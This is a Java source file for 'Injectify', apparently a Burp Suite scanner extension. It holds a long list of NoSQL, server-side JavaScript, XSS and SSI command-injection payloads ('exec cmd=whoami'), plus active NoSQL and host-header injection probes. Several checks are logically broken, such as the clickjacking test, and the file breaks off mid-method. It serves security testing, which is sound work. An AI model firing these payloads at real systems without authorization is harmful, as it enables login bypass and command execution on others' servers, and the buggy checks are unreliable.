package burp;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.io.PrintWriter;
import java.lang.Math;
import org.json.JSONObject;
import org.json.JSONArray;

import javax.swing.JMenuItem;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;

public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInsertionPointProvider, IContextMenuFactory, IHttpListener
{
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;

	private PrintWriter stdout;
	private PrintWriter stderr;

	public static final boolean ENABLE_EXPERIMENTAL_PAYLOADS = true;

	public final String EXTENSION_NAME    = "Injectify";
	public final String EXTENSION_VERSION = "1.0";
	public final String EXTENSION_AUTHOR  = "xxx";
	public final String EXTENSION_URL     = "https://www.github.com/ArturusR3x";

	byte INJ_TYPE_JSON = 0;
	byte INJ_TYPE_JSON_ERROR = 1;
	byte INJ_TYPE_URL_BODY = 2;
	byte INJ_TYPE_URL_BODY_ERROR = 3;
	byte INJ_TYPE_FUNC = 4;
	byte INJ_TYPE_TIME = 6;
	byte INJ_TYPE_MULTI = 8;

	private List<InjectionPayload> INJS_ALL;
	private ArrayList<String> inj_errors;

	// load nosqli payloads
	private int loadInjectionPayloads()
	{
		this.INJS_ALL = new ArrayList<InjectionPayload>();

		this.inj_errors = new ArrayList<String>();
		this.inj_errors.add("unknown operator");
		this.inj_errors.add("cannot be applied to a field");
		this.inj_errors.add("expression is invalid");
		this.inj_errors.add("has to be a string");
		this.inj_errors.add("must be a boolean");
		this.inj_errors.add("use $a with");
		this.inj_errors.add("use &a with");
		this.inj_errors.add("JSInterpreterFailure");
		this.inj_errors.add("BadValue");
		this.inj_errors.add("MongoError");

		// json
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"$eq\":\"1\"}", "{\"$ne\":\"1\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"$lt\":\"\"}", "{\"$gt\":\"\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"$exists\":false}", "{\"$exists\":true}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"$regex\":\".^\"}", "{\"$regex\":\".*\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"$where\":\"return false\"}", "{\"$where\":\"return true\"}", null));

		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"$\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"$where\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"$regex\":\"*\"}", null, this.inj_errors)); // pymongo
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"$regex\":null}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"$exists\":null}", null, this.inj_errors)); // mongoose
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"$a\":null}", null, this.inj_errors)); // mongoose

		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"&eq\":\"1\"}", "{\"&ne\":\"1\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"&lt\":\"\"}", "{\"&gt\":\"\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"&exists\":false}", "{\"&exists\":true}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"&regex\":\".^\"}", "{\"&regex\":\".*\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"&where\":\"return false\"}", "{\"&where\":\"return true\"}", null));

		//add
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "{\"&regex\":\"admin*\"}", "{\"&ne\":\"test\"}", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&regex\":admin*}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "%7B%22%24regex%22%3A%22admin%2A%22%7D%2C%22password%22%3A%7B%22%24ne%22%3A%22test%2A%22%7D", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "<a href=javascript:confirm(&quot;XSS&quot;)>www.evil.com</a>", "<a href=javascript:confirm(&quot;XSS&quot;)>www.evil.com</a>", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "<a href=javascript:confirm(&quot;XSS&quot;)>www.evil.com</a>", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "<h1>Hello</h1>", "<h1>Hello</h1>", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "<h1>Hello</h1>", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "\"accesskey='x'onclick\"alert(1)", "\"accesskey='x'onclick\"alert(1)\"", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "\"accesskey='x'onclick\"alert(1)", null, this.inj_errors));


		// SSI Injection
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "<!--#exec cmd=whoami -->", "<!--#exec cmd=whoami-->", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "<!--#exec cmd=\"whoami\" -->", "<!--#exec cmd=\"whoami\"-->", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "<!--#exec cmd=\"ls\" -->", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "<!--#exec cmd=ls -->", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "<!--#exec cmd=\"ls\"-->", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "<!--#exec cmd=ls-->", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "%3C%21--%23exec+cmd%3Dls+--%3E", "%3C%21--%23exec%20cmd%3Dwhoami--%3E", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON, "%3C%21--%23exec+cmd%3Dls+--%3E", "%3C%21--%23exec%20cmd%3Dwhoami--%3E", null));



		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&where\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&regex\":\"*\"}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&regex\":null}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&exists\":null}", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_JSON_ERROR, "{\"&a\":null}", null, this.inj_errors)); // mongoose


		// url-encoded
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%24eq%5d=1", "%5b%24ne%5d=1", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%24lt%5d=", "%5b%24gt%5d=", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%24exists%5d=false", "%5b%24exists%5d=true", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%24regex%5d=.%5e", "%5b%24regex%5d=.*", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%24where5d=return%20false", "%5b%24where5d=return%20true", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%7B%22%24regex%22%3A%22admin%2A%22%7D%2C%22password%22%3A%7B%22%24ne%22%3A%22test%2A%22%7D", "%7B%22%24regex%22%3A%22admin%2A%22%7D%2C%22password%22%3A%7B%22%24ne%22%3A%22test%2A%22%7D", null));


		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24where%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24regex%5d=*", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24regex%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24exists%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24a%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%7B%22%24regex%22%3A%22admin%2A%22%7D%2C%22password%22%3A%7B%22%24ne%22%3A%22test%2A%22%7D", null, this.inj_errors));

		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%26eq%5d=1", "%5b%26ne%5d=1", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%26lt%5d=", "%5b%26gt%5d=", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%26exists%5d=false", "%5b%26exists%5d=true", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%26regex%5d=.%5e", "%5b%26regex%5d=.*", null));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%26where5d=return%20false", "%5b%26where5d=return%20true", null));

		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26where%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26regex%5d=*", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26regex%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26exists%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26a%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "'", null, this.inj_errors));
		this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY_ERROR, "\\'", null, this.inj_errors));

		if (this.ENABLE_EXPERIMENTAL_PAYLOADS)
		{
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%7c%7c1==2", "%7c%7c1==1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "'%7c%7c'a'=='b", "'%7c%7c'a'=='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "\\'%7c%7c'a'=='b", "\\'%7c%7c'a'=='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "\\\'%7c%7c'a'=='b", "\\\'%7c%7c'a'=='a", null));

			// mongodb, experimentals
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "true,$where:'1==2'", "true,$where:'1==1'", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, ",$where:'1==2'", ",$where:'1==1'", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "$where:'1==2'", "$where:'1==1'", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "',$where:'1==2", "',$where:'1==1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "1,$where:'1==2'", "1,$where:'1==1'", null));

			// ssji, experimentals
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "';return 'a'=='b' && ''=='", "';return 'a'=='a' && ''=='", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\\';return 'a'=='b' && ''=='", "\\';return 'a'=='a' && ''=='", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\\\';return 'a'=='b' && ''=='", "\\\';return 'a'=='a' && ''=='", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\";return 'a'=='b' && ''=='", "\";return 'a'=='b' && ''=='", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\\\";return 'a'=='b' && ''=='", "\\\";return 'a'=='b' && ''=='", null));

			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", "{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\";return(false);var xyz='a", "\";return(true);var xyz='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "';return(false);var xyz='a", "';return(true);var xyz='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "\\';return(false);var xyz='a", "\\';return(true);var xyz='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "a';return false;var xyz='a", "a';return true;var xyz='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "a\\';return false;var xyz='a", "a\\';return true;var xyz='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "a\";return true;var xyz=\"a", "a\";return false; var xyz=\"a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "0;return false", "0;return true", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_FUNC, "require('os').endianness()=='LE'", "require('os').endianness()=='BE'", null)); // node.js

			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "{\"$where\":\"sleep(1)\"}", "{\"$where\":\"sleep(10000)\"}", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "{\"&where\":\"sleep(1)\"}", "{\"&where\":\"sleep(10000)\"}", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "$where:\"sleep(1)\"", "$where:\"sleep(10000)\"", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "$where:'sleep(1)'", "$where:'sleep(10000)'", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "sleep(1)", "sleep(10000)", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "a;sleep(1)", "a;sleep(10000)", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "'a';sleep(1)", "'a';sleep(10000)", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "a';sleep(1);var xyz='a", "a';sleep(10000);var xyz='a", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "';sleep(1);var xyz='0", "';sleep(10000);var xyz='0", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "\\';sleep(1);var xyz='0", "\\';sleep(10000);var xyz='0", null));

			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1", "var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz=1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "1;var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1", "1;var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz=1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "1';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1", "1';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1", "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_TIME, "\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", "{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", null));

			// experimentals
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "_security", "_all_docs", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "%5b%5d=_security", "%5b%5d=_all_docs", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", "\"username\"{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_URL_BODY, "\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", "\"username\"{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", null));


			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_MULTI, "\"username\":{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", "\"username\"{\"$regex\":\"admin*\"},\"password\":{\"$ne\":\"test*\"}", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_MULTI, "%5b%24eq%5d=1", "%5b%24ne%5d=1", null));
			this.INJS_ALL.add(new InjectionPayload(INJ_TYPE_MULTI, "%5b%26eq%5d=1", "%5b%26ne%5d=1", null));
		}

		/*
		this.INJS_ALL.forEach((e)  ->
		{
			this.stdout.println("Show current payload");
			this.stdout.println("Type: " + e.get_payloadType() + ", Payload 1: " + new String(e.get_payload_1()) + ", Payload 2: " + new String(e.get_payload_2()) + ", Error: " + e.get_err());
		});*/

		return INJS_ALL.size();
	}

	// IContextMenuFactory
	public String ConvertJSONtoQueryString(JSONObject jsonObj, String arrayName, int arrayIndex){
		String out = "";
		try {
			for (String keyStr : jsonObj.keySet()){
				Object keyvalue = jsonObj.get(keyStr);
				if (keyvalue instanceof JSONObject){
					out += ConvertJSONtoQueryString((JSONObject)keyvalue, null, 0);
				}
				else if (keyvalue instanceof JSONArray){
					JSONArray array = jsonObj.getJSONArray(keyStr);
					Iterator<Object> iterator = array.iterator();

					while(iterator.hasNext()){
						out += ConvertJSONtoQueryString((JSONObject) iterator.next(), keyStr, arrayIndex++);
					}
				}
				else{
					if (arrayName != null){
						out += "&" + arrayName + "[" + arrayIndex + "][" + keyStr + "]="+ keyvalue;
					}
					else{
						out += "&" + keyStr + "=" + keyvalue;
					}
				}
			}
		}
		catch (Exception e){
			e.printStackTrace();
		}

		return out;
	}

	@Override
	public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation)
	{
		List<JMenuItem> jmenu = new ArrayList<>();

		if (invocation.getToolFlag() != IBurpExtenderCallbacks.TOOL_INTRUDER && invocation.getInvocationContext() != IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_REQUEST)
		{
			return jmenu;
		}

		JMenuItem menuItem_toQueryString = new JMenuItem("Convert to QueryString");

		menuItem_toQueryString.addMouseListener(new MouseListener()
		{
			public void mouseClicked(MouseEvent arg0)	{
			}

			public void mouseEntered(MouseEvent arg0) {
			}

			public void mouseExited(MouseEvent arg0) {
			}

			public void mousePressed(MouseEvent arg0) {
			}

			public void mouseReleased(MouseEvent arg0)
			{
				try
				{
					IHttpRequestResponse iReqResp = invocation.getSelectedMessages()[0];
					byte[] tmpReq = iReqResp.getRequest();
					IRequestInfo reqInfo = helpers.analyzeRequest(tmpReq);
					String requestStr = helpers.bytesToString(tmpReq);

					if (reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_JSON)
					{
						int bodyOff = reqInfo.getBodyOffset();
						if (bodyOff > 0)
						{
							String body = requestStr.substring(bodyOff);
							if (body.length() > 0)
							{
								JSONObject jsonObj = new JSONObject(body.trim());
								String queryString = ConvertJSONtoQueryString(jsonObj, null, 0);
								queryString = queryString.substring(1);

								String newRequestStr = requestStr.substring(0, bodyOff) + queryString;
								byte[] newRequest = helpers.stringToBytes(newRequestStr);
								IRequestInfo newReqInfo = helpers.analyzeRequest(newRequest);
								List<String> headers = newReqInfo.getHeaders();

								Iterator<String> iter = headers.iterator();
								while(iter.hasNext())
								{
									String tmp = iter.next();
									if (tmp.contains("Content-Type")) iter.remove();
									if (tmp.contains("Content-Length")) iter.remove();
								}
								headers.add("Content-Length: " + queryString.length());
								headers.add("Content-Type: application/x-www-form-urlencoded");

								byte[] request = helpers.buildHttpMessage(headers, helpers.stringToBytes(queryString));
								iReqResp.setRequest(request);
							}
						}
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		});

		jmenu.add(menuItem_toQueryString);
		return jmenu;
	}

	// IBurpExtender

	@Override
	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
	{
		// keep a reference to our callbacks object
		this.callbacks = callbacks;
		this.stdout = new PrintWriter(callbacks.getStdout(), true);
		this.stderr = new PrintWriter(callbacks.getStderr(), true);

		// obtain an extension helpers object
		this.helpers = callbacks.getHelpers();

		int c = loadInjectionPayloads();
		this.stdout.println(EXTENSION_NAME + " v" + EXTENSION_VERSION + " - Loaded " + c + " payload(s).");

		// set our extension name
		callbacks.setExtensionName(EXTENSION_NAME);

		callbacks.registerScannerInsertionPointProvider(this);
		callbacks.registerScannerCheck(this);
		callbacks.registerContextMenuFactory(this);
	}

	// helper method to search a response for occurrences of a literal match string
	// and return a list of start/end offsets
	private List<int[]> getMatches(byte[] response, byte[] match)
	{
		List<int[]> matches = new ArrayList<int[]>();

		int start = 0;
		while (start < response.length)
		{
			start = helpers.indexOf(response, match, false, start, response.length);
			if (start == -1) break;
			matches.add(new int[] { start, start + match.length });
			start += match.length;
		}

		return matches;
	}

	// IScannerInsertionPointProvider
	@Override
	public List<IScannerInsertionPoint> getInsertionPoints(IHttpRequestResponse baseRequestResponse){
		List<IScannerInsertionPoint> insertionPoints = new ArrayList<IScannerInsertionPoint>();

		byte[] request = baseRequestResponse.getRequest();
		String requestStr = new String(request);
		IRequestInfo reqInfo = helpers.analyzeRequest(request);
		for (int i = 0; i<2; i++){
			if(i == 0){
				for (IParameter p: reqInfo.getParameters()){

					if (p.getType() == IParameter.PARAM_JSON){
						int start = p.getValueStart();
						char s = requestStr.charAt(start-1);
						if (s == '"') start--;

						int end = p.getValueEnd();
						char e = requestStr.charAt(end);
						if (e == '"') end++;

						insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, start, end));
					}
					else if (p.getType() == IParameter.PARAM_BODY || p.getType() == IParameter.PARAM_URL){
						int start = p.getNameEnd();
						char s = requestStr.charAt(start);
						int end = p.getValueEnd();

						insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, start, end));
					}
					else{
						continue;
					}
					insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, p.getValueStart(), p.getValueEnd()));
				}
			}
			else{
				for (IParameter p: reqInfo.getParameters()){
					// handle json parameter
					if (p.getType() == IParameter.PARAM_JSON){
						int start = p.getValueStart();
						char s = requestStr.charAt(start-1);
						if (s == '"') start--;

						int end = p.getValueEnd();
						char e = requestStr.charAt(end);
						if (e == '"') end++;

						insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, start, end));
					}
					else if (p.getType() == IParameter.PARAM_BODY || p.getType() == IParameter.PARAM_URL){
						int start = p.getNameEnd();
						char s = requestStr.charAt(start);
						int end = p.getValueEnd();


						String modifiedRequest = requestStr.substring(0, start) + requestStr.substring(start, end).
								replaceAll("\"", "") + requestStr.substring(end);
						byte[] modifiedRequestBytes = modifiedRequest.getBytes();

						insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, modifiedRequestBytes, start, end));
					}
					else{
						continue;
					}

					insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, p.getValueStart(), p.getValueEnd()));
				}
			}
		}

//		RemoveQuotes removeQuotes = new RemoveQuotes(callbacks);
//		removeQuotes.processHttpMessage();
		return insertionPoints;
	}

	// IScannerCheck

	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse)
	{
		List<IScanIssue> issues = new ArrayList<>();

		byte[] response = baseRequestResponse.getResponse();

		if (response.length == 0) return issues;

		this.INJS_ALL.forEach((e) ->
		{
			if (e.get_err() != null && e.get_err().size() > 0)
			{
				Iterator<String> it = e.get_err().iterator();

				while (it.hasNext())
				{
					String err = it.next();

					List<int[]> matches = getMatches(response, err.getBytes());

					if (matches.size() > 0)
					{
						// report the issue
						issues.add(
							new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								helpers.analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
								"NoSQL Error Message Detected",
								"The response contains the string: " + err,
								"Medium",
								"Certain"
							)
						);
						break; // stop at first error message detected
					}
				}
			}
		});

		IResponseInfo responseInfo = callbacks.getHelpers().analyzeResponse(response);
		List<String> headers = responseInfo.getHeaders();

		for (String header : headers){
			if (header.toLowerCase().startsWith("x-frame-options")){
				if (!header.toLowerCase().contains("deny") || !header.toLowerCase().contains("sameorigin")){
					//if found
					new CustomScanIssue(
							baseRequestResponse.getHttpService(),
							helpers.analyzeRequest(baseRequestResponse).getUrl(),
							new IHttpRequestResponse[] { baseRequestResponse },
							"Clickjacking Detected",
							"X-Frame-Options HTTP Response Header is set to Deny",
							"High",
							"Certain"
					);
					break;
				}
			}
		}

		return issues;
	}

	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)
	{
		List<IScanIssue> issues = new ArrayList<>();
		
//		issues.add(new CustomScanIssue(
//				baseRequestResponse.getHttpService(),
//				callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
//				new IHttpRequestResponse[]{baseRequestResponse},
//				"TESTING",
//				"The response differs, indicating a possible NoSQL injection using payload: ",
//				"High",
//				"Tentative"
//		));

		//NOSQL URL
		IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
		List<IParameter> parameters = requestInfo.getParameters();
		boolean NoSQLInjection = false;

		for (IParameter parameter : parameters){
			String originalValue = parameter.getValue();
			String modifiedValue = originalValue + "%22%20%7C%7C%20%224%22%20!%3D%20%225";

			byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(),
					helpers.buildParameter(parameter.getName(), modifiedValue, parameter.getType()));

			IHttpRequestResponse newMessageInfo = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
			byte[] originalResponse = baseRequestResponse.getResponse();
			byte[] newResponse = newMessageInfo.getResponse();

			IResponseInfo newResponseInfo = helpers.analyzeResponse(newResponse);
			int statusCode = newResponseInfo.getStatusCode();

			if (statusCode < 400 && !helpers.bytesToString(originalResponse).equals(helpers.bytesToString(newResponse))) {

				issues.add(new CustomScanIssue(
						baseRequestResponse.getHttpService(),
						callbacks.getHelpers().analyzeRequest(baseRequestResponse).getUrl(),
						new IHttpRequestResponse[]{baseRequestResponse},
						"NoSQL Injection Vulnerability Detected",
						"Possible injection vulnerability found in URL. Original parameter: " + parameter.getName() + ". Injected Value: " + modifiedValue,
						"High",
						"Tentative"
				));
				NoSQLInjection = true;
			}
			break;
		}

		//HHI
		String originalHost = baseRequestResponse.getHttpService().getHost();
		String payload = "www.evil.com";

		String injectHostPayload = payload;
		IHttpRequestResponse modifiedRequestResponse5 = sendModifiedRequest(baseRequestResponse, injectHostPayload);

// 2. Inject duplicate Host headers
		String duplicateHostPayload = originalHost + "\r\nHost: " + payload;
		IHttpRequestResponse modifiedRequestResponse1 = sendModifiedRequest(baseRequestResponse, duplicateHostPayload);


// 3. Inject host override headers
		String hostOverridePayload = originalHost + "\r\nX-Forwarded-Host: " + payload;
		IHttpRequestResponse modifiedRequestResponse4 = sendModifiedRequest(baseRequestResponse, hostOverridePayload);


		boolean hasHHI1 = checkForInjection(modifiedRequestResponse1, payload);
		boolean hasHHI2 = checkForInjection(modifiedRequestResponse4, payload);
		boolean hasHHI3 = checkForInjection(modifiedRequestResponse5, payload);

		checkForInjection(modifiedRequestResponse1, payload);
		checkForInjection(modifiedRequestResponse4, payload);
		checkForInjection(modifiedRequestResponse5, payload);

//		IResponseInfo responseInfo = helpers.analyzeResponse(modifiedRequestResponse1.getResponse());
//		int statusCode = responseInfo.getStatusCode();

		if(hasHHI1 ){
			issues.add(new CustomScanIssue(
					modifiedRequestResponse1.getHttpService(),
					callbacks.getHelpers().analyzeRequest(modifiedRequestResponse1).getUrl(),
					new IHttpRequestResponse[]{modifiedRequestResponse1},
					"Host Header Injection Detected",
					"The Host header may be injectable with the payload: " + payload,
					"High",
					"Certain"
			));
		} else if (hasHHI2) {
			issues.add(new CustomScanIssue(
					modifiedRequestResponse4.getHttpService(),
					callbacks.getHelpers().analyzeRequest(modifiedRequestResponse4).getUrl(),
